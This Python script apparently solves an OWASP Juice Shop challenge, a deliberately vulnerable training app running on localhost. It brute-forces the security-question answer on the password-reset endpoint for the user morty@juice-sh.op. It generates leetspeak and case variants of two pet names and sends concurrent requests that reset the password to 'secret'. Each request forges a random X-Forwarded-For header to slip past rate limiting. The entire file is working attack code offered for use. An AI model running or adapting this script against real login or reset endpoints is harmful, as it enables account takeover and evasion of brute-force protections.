#!/usr/local/bin/python3.7
import itertools
import random
import ipaddress
import time
import aiohttp
import asyncio


base_url = 'http://localhost:3000'
new_pass = 'secret'
possible_answers = ['Snuffles', 'Snowball']
sem_pool = 20
leet = {'o': '0', 'i': '1', 'z': '2', 'e': '3', 'a': '4', 's': '5', 'g': '6', 't': '7', 'b': '8', 'l': '1'}


def leet_case_combos(word):
    possibles = []
    for char_lower in word.lower():
        char_lower_leet = leet.get(char_lower, char_lower)
        possibles.append((char_lower,char_lower.upper(),)if char_lower_leet == char_lower else (char_lower,char_lower.upper(),char_lower_leet))
    return itertools.product(*possibles)  # returns a generator


async def bound_fetch(sem, session, answer, done):
    json = {'email': 'morty@juice-sh.op', 'answer': answer, 'new': new_pass, 'repeat': new_pass}
    headers = { # on localhost you don't need all the headers but on remote servers (Heroku etc) they might be required
        'Pragma': 'no-cache',
        'Origin': base_url,
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/json',
        'Accept-Language': 'en-GB,en;q=0.9,en-US;q=0.8,de;q=0.7',
        'Accept': 'application/json, text/plain, */*',
        'Cache-Control': 'no-cache',
        'Referer': base_url,
        'Connection': 'keep-alive',
        'X-Forwarded-For': str(ipaddress.IPv4Address(random.getrandbits(32)))
    }
    url = '%s/rest/user/reset-password' % base_url
    async with sem, session.post(url=url, json=json, headers=headers) as response:
        if response.status == 200:
            done.set()
            done.run_answer = json['answer']
        elif response.status == 401:
            print('Wrong answer: %s' % json['answer'])
        else:
            print(response)


async def run():
    sem = asyncio.Semaphore(sem_pool)
    done = asyncio.Event()
    tasks = []
    async with aiohttp.ClientSession() as session:
        for word in possible_answers:
            for leet_case_tuple in leet_case_combos(word):
                tasks.append(asyncio.create_task(bound_fetch(sem=sem, session=session, answer=''.join(leet_case_tuple), done=done)))
        print('Total answers to check: %d' % len(tasks))
        await done.wait()
        for task in tasks:
            task.cancel()
        print('Right answer found: %s' % done.run_answer)


def main():
    start_time = time.time()
    asyncio.run(run())
    elapsed_time = '%0.2f'%(time.time() - start_time)
    print('Took: %ss.' % elapsed_time)


if __name__ == '__main__':
    main()
